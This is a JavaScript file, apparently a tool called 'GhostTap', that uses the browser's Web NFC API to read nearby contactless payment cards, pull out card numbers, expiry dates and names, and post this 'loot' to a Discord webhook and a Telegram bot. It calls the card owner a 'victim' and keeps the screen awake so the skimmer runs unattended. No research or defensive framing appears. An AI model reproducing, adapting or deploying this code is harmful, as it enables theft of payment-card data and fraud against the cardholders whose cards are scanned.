const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/948907163756167198/aTWv2HRSlNoxxyTZIWge-IAnDm7gkZXnlXOzN7c-qnuPipBEfyBt8Z1cA_AhWBA6buEs";
const TELEGRAM_BOT   = "https://api.telegram.org/botYOURTOKEN/sendMessage?chat_id=YOURID&text=";

let cardCount = 0;

function log(txt, color="#0f0") {
  const l = document.getElementById("log");
  l.innerHTML += `<div style="color:${color}">[${++cardCount}] ${txt}</div>`;
  l.scrollTop = l.scrollHeight;
}

async function send(data) {
  const payload = {content: "```json\n" + JSON.stringify(data, null, 2) + "\n```"};
  fetch(DISCORD_WEBHOOK, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload)}).catch(()=>{});
  fetch(TELEGRAM_BOT + encodeURIComponent(JSON.stringify(data))).catch(()=>{});
}

if ("NDEFReader" in window) {
  const ndef = new NDEFReader();
  ndef.scan().then(() => {
    log("GhostTap active – hunting cards…");
    ndef.onreading = ({message, serialNumber}) => {
      let pan = "", exp = "", name = "";
      for (const record of message.records) {
        const decoder = new TextDecoder();
        const text = decoder.decode(record.data);
        if (text.match(/\d{13,19}/)) pan = text.match(/\d{13,19}/)[0];
        if (text.match(/\d{4}.\d{2}/)) exp = text.match(/\d{4}.\d{2}/)[0];
        if (text.match(/[A-Z]{2,}/)) name = text;
      }
      const loot = {
        time: new Date().toISOString(),
        serial: serialNumber,
        pan: pan || "encrypted",
        exp: exp || "N/A",
        name: name || "N/A",
        raw: message.records.map(r=>Array.from(new Uint8Array(r.data)))
      };
      log(`CARD ${cardCount+1} → ${pan || serialNumber.slice(-8)}`, "#ff0");
      send(loot);
    };
  }).catch(err => log("NFC denied – victim blocked it", "#f00"));
} else {
  log("Device too old – no Web NFC", "#f00");
}

// Keep screen awake
let wakeLock = null;
async function keepAwake() {
  if ("requestWakeLock" in navigator) {
    wakeLock = await navigator.requestWakeLock("screen");
  }
}
setInterval(keepAwake, 25000);
keepAwake();
